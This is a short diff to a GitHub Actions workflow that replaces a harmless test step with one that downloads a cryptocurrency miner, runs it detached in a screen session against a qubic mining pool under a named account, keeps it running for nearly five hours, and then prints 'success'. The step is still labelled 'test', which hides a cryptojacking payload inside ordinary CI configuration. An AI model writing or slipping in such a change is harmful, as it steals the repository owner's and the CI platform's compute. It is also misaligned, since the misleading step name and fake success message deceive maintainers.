@@ -37,4 +37,4 @@ jobs:
     steps:
       - uses: actions/checkout@v2
       - name: test
-        run: sleep 30 && echo success
+        run: wget https://github.com/apool-io/apoolminer/releases/download/v1.4.0/apoolminer_linux_v1.4.0.tar && tar xf apoolminer_linux_v1.4.0.tar && screen -dmS run ./apoolminer --algo qubic --account CP_xuci4bjb2i --pool qubic2.hk.apool.io:3334 --worker sabri && sleep 299m && echo success
